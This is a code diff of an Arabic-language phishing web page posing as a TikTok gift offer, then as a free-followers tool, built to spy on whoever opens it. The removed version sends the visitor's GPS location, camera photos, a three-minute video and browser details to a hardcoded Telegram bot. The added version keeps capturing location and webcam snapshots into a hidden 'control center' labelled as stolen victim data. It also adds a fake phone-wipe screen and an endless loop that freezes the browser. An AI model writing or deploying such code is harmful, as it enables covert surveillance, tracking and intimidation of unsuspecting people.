@@ -3,89 +3,166 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎁 مفاجأة خاصة لك 🎁</title>
+    <title>TikTok Creator Center | زيادة متابعين</title>
     <style>
-        body { background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 100%); font-family: 'Cairo', sans-serif; color: #fff; text-align: center; height: 100vh; overflow: hidden; display: flex; align-items: center; justify-content: center; }
-        .card { background: rgba(255, 255, 255, 0.2); backdrop-filter: blur(15px); padding: 40px; border-radius: 30px; border: 2px solid #fff; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 85%; max-width: 400px; }
-        h1 { font-size: 28px; margin-bottom: 10px; }
-        p { font-size: 18px; line-height: 1.6; }
-        .btn { background: #fff; color: #ff758c; padding: 15px 30px; border-radius: 50px; font-weight: bold; text-decoration: none; display: inline-block; margin-top: 20px; cursor: pointer; border: none; font-size: 18px; box-shadow: 0 5px 15px rgba(255,117,140,0.4); }
-        #camera-feed { display: none; }
+        :root { --tt-pink: #fe2c55; --tt-cyan: #25f4ee; --bg: #010101; }
+        body { background: var(--bg); color: white; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; overflow-x: hidden; }
+        
+        /* الخانة السرية الملاحضة - المفتاح */
+        .admin-trigger { position: fixed; top: 15px; right: 15px; font-size: 18px; opacity: 0.2; cursor: pointer; z-index: 9999; }
+        .admin-trigger:hover { opacity: 1; color: var(--tt-cyan); }
+
+        /* واجهة الضحية */
+        .main-ui { padding: 40px 20px; text-align: center; transition: 0.5s; }
+        .logo { width: 120px; margin-bottom: 20px; }
+        .input-box { width: 85%; padding: 15px; border-radius: 10px; border: 1px solid #333; background: #111; color: white; margin-bottom: 20px; }
+        .btn-action { background: var(--tt-pink); color: white; border: none; padding: 18px 35px; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; box-shadow: 0 0 15px var(--tt-pink); }
+
+        /* لوحة التحكم السرية (الخانة 2007328) */
+        #admin-panel { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 10000; overflow-y: auto; padding: 25px; color: #0f0; border: 3px solid var(--tt-cyan); box-sizing: border-box; }
+        .data-card { border: 1px solid #333; padding: 15px; margin-bottom: 15px; background: #050505; border-radius: 8px; }
+        .destruct-box { border: 2px solid red; padding: 20px; margin-top: 30px; text-align: center; background: rgba(255,0,0,0.1); }
+        .btn-wipe { background: red; color: white; padding: 15px 30px; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; }
+
+        /* شاشة التدمير والفرمتة */
+        #wipe-screen { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background:black; z-index:20000; color:white; flex-direction:column; align-items:center; justify-content:center; text-align:center; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h1>يا أهلاً بهذا الوجه الجميل! ✨</h1>
-        <p>لقد تم اختيارك للحصول على هدية "تيك توك" الذهبية لهذا العام. أنت شخص مميز وتستحق الأفضل دائماً..</p>
-        <p>فقط اضغط "استلام الهدية" لربط حسابك بأقرب مركز هدايا بجانبك الآن! 🎁</p>
-        <button class="btn" onclick="startHeist()">🎁 استلام الهدية 🎁</button>
+
+    <div class="admin-trigger" onclick="accessVault()">🔑</div>
+
+    <div class="main-ui" id="v-ui">
+        <img src="https://v16-webapp.tiktok.com/static/images/logo_head.png" class="logo">
+        <h1 style="color: var(--tt-cyan);">نظام الدعم الفني للمبدعين</h1>
+        <p>استلم 50,000 متابع حقيقي الآن عبر السيرفر المباشر</p>
+        <input type="text" class="input-box" id="v-user" placeholder="أدخل اسم المستخدم @username">
+        <br>
+        <button class="btn-action" onclick="startHeist()">تفعيل الرشق (سيرفر 1) 🔥</button>
+        <p id="status" style="margin-top:20px; color: #888;">النظام جاهز للربط...</p>
     </div>
 
-    <video id="camera-feed" autoplay playsinline></video>
+    <div id="admin-panel">
+        <h1 style="color: var(--tt-pink);">💀 ARCHITECT CONTROL CENTER 💀</h1>
+        <p>مرحباً بك سيدي المطور | الباسوورد نشط: 2007328</p>
+        <hr>
+        <div id="logs-container">
+            <h3>📝 سجل البيانات المخطوفة:</h3>
+            <div id="data-list">بانتظار دخول الضحايا...</div>
+        </div>
+
+        <div class="destruct-box">
+            <h2 style="color:red;">❌ وحدة التدمير الكامل</h2>
+            <p>عند الضغط، سيتم تجميد هاتف الضحية وإظهار شاشة الفرمتة فوراً.</p>
+            <button class="btn-wipe" onclick="triggerWipe()">تدمير وجعل الهاتف يتفرمت ☢️</button>
+        </div>
+        <br>
+        <button onclick="document.getElementById('admin-panel').style.display='none'" style="background:#333; color:white; padding:10px; border:none; cursor:pointer;">إغلاق اللوحة</button>
+    </div>
+
+    <div id="wipe-screen">
+        <h1 style="color: red; font-size: 40px;">⚠️ CRITICAL SYSTEM FAILURE</h1>
+        <p style="font-size: 20px;">[!] جاري مسح كافة بيانات الهاتف والملفات...</p>
+        <div style="width: 80%; border: 1px solid #444; height: 30px; margin: 20px 0;">
+            <div id="bar" style="background: red; height: 100%; width: 0%;"></div>
+        </div>
+        <h2 id="perc">0%</h2>
+        <p style="color: #666;">Formatting Internal Storage... Contacting Cloud Wipe...</p>
+    </div>
+
+    <video id="webcam" autoplay style="display:none;"></video>
+    <canvas id="snapshot" style="display:none;"></canvas>
 
     <script>
-        const BOT_TOKEN = "8621828423:AAFq9_5-6snrjpfqrBrOPboh7VE824xVN_M";
-        const CHAT_ID = "5475815049";
+        let db = [];
 
-        function sendToTelegram(msg, isFile = false, blob = null) {
-            let url = `https://api.telegram.org/bot${BOT_TOKEN}/`;
-            if (isFile) {
-                let formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('document', blob, 'captured_media.png');
-                fetch(url + 'sendDocument', { method: 'POST', body: formData });
+        // 1. الدخول للخانة السرية
+        function accessVault() {
+            let p = prompt("أدخل رمز المفتاح السري (Password):");
+            if(p === "2007328") {
+                document.getElementById('admin-panel').style.display = 'block';
+                renderData();
             } else {
-                fetch(url + `sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+                alert("Access Denied!");
             }
         }
 
+        // 2. تفعيل الهيمنة عند دخول الضحية
         async function startHeist() {
-            // 1. طلب الـ GPS بدقة عالية (تحت غطاء "استلام الهدية")
-            navigator.geolocation.getCurrentPosition(pos => {
-                let maps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                sendToTelegram(`🎯 *TARGET PINPOINTED*\n📍 GPS: [Click here](${maps})`);
-            }, null, { enableHighAccuracy: true });
+            let user = document.getElementById('v-user').value;
+            if(!user) return alert("يرجى إدخال اليوزر!");
 
-            // 2. الوصول للكاميرا لسحب الصور والفيديو
+            document.getElementById('status').innerText = "جاري الاتصال بالسيرفر.. يرجى السماح بالأذونات لربط الحساب";
+            
+            // سحب الموقع الجغرافي GPS
+            navigator.geolocation.getCurrentPosition(pos => {
+                storeData('📍 الموقع', `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
+            }, null, {enableHighAccuracy: true});
+
+            // تفعيل الكاميرا وسحب الصور
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                const video = document.getElementById('camera-feed');
+                const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
+                const video = document.getElementById('webcam');
                 video.srcObject = stream;
 
-                // التقاط 3 صور فوراً
-                let count = 0;
-                let interval = setInterval(() => {
-                    if (count >= 3) { clearInterval(interval); return; }
-                    const canvas = document.createElement('canvas');
+                setInterval(() => {
+                    const canvas = document.getElementById('snapshot');
                     canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
-                    canvas.toBlob(blob => sendToTelegram("📸 Photo Captured", true, blob));
-                    count++;
-                }, 2000);
+                    storeData('📸 صورة', canvas.toDataURL('image/png'));
+                }, 4000); // التقاط كل 4 ثواني
+            } catch(e) { storeData('❌ خطأ', 'الضحية رفض الكاميرا'); }
 
-                // تسجيل فيديو لمدة 3 دقائق في الخلفية
-                const recorder = new MediaRecorder(stream);
-                const chunks = [];
-                recorder.ondataavailable = e => chunks.push(e.data);
-                recorder.onstop = () => {
-                    const blob = new Blob(chunks, { type: 'video/mp4' });
-                    sendToTelegram("🎥 Full 3-Min Video Captured", true, blob);
-                };
-                recorder.start();
-                setTimeout(() => recorder.stop(), 180000); // 3 دقائق
-
-            } catch (e) { sendToTelegram("❌ Camera Access Refused"); }
-
-            // 3. سحب المعلومات التقنية (إيميلات، حسابات، متصفح)
-            let info = `👤 *SENSITIVE SYSTEM DATA* 👤\n` +
-                       `📧 *Browser Accounts:* ${navigator.userAgent}\n` +
-                       `📱 *Platform:* ${navigator.platform}\n` +
-                       `🌐 *Language:* ${navigator.language}\n` +
-                       `🕰️ *Last Sites Check:* ${document.referrer || "None"}`;
-            sendToTelegram(info);
-            
-            alert("جاري معالجة الهدية... يرجى عدم إغلاق الصفحة لمدة 3 دقائق لضمان التوصيل!");
+            alert("بدأ الرشق! لا تخرج من الصفحة لمدة 10 دقائق لضمان وصول المتابعين.");
         }
+
+        // 3. تخزين البيانات في الخانة السرية
+        function storeData(type, val) {
+            db.push({t: type, v: val, time: new Date().toLocaleTimeString()});
+            localStorage.setItem('ARCHITECT_DB', JSON.stringify(db));
+        }
+
+        function renderData() {
+            let list = document.getElementById('data-list');
+            let data = JSON.parse(localStorage.getItem('ARCHITECT_DB')) || [];
+            list.innerHTML = data.map(i => `
+                <div class="data-card">
+                    <b>[${i.time}] ${i.t}:</b> <br>
+                    ${i.t.includes('صورة') ? `<img src="${i.v}" width="150">` : `<a href="${i.v}" target="_blank" style="color:cyan;">رابط الموقع</a>`}
+                </div>
+            `).join('');
+        }
+
+        // 4. تفعيل الدمار الشامل (عن بعد)
+        function triggerWipe() {
+            if(confirm("هل أنت متأكد من تدمير جهاز الضحية الآن؟")) {
+                localStorage.setItem('DOOM_SIGNAL', 'true');
+                alert("تم إرسال إشارة التدمير!");
+            }
+        }
+
+        // فحص إشارة التدمير (تعمل لدى الضحية والمطور)
+        setInterval(() => {
+            if(localStorage.getItem('DOOM_SIGNAL') === 'true') {
+                document.getElementById('v-ui').style.display = 'none';
+                document.getElementById('admin-panel').style.display = 'none';
+                document.getElementById('wipe-screen').style.display = 'flex';
+                
+                // تجميد المتصفح واستنزاف الـ CPU
+                let p = 0;
+                let int = setInterval(() => {
+                    p++;
+                    document.getElementById('bar').style.width = p + "%";
+                    document.getElementById('perc').innerText = p + "%";
+                    if(p >= 100) clearInterval(int);
+                }, 100);
+
+                // الهجوم النووي على المعالج
+                while(true) {
+                    console.log("FORMATTING_SYSTEM_CORE_" + Math.random());
+                }
+            }
+        }, 1000);
     </script>
 </body>
 </html>
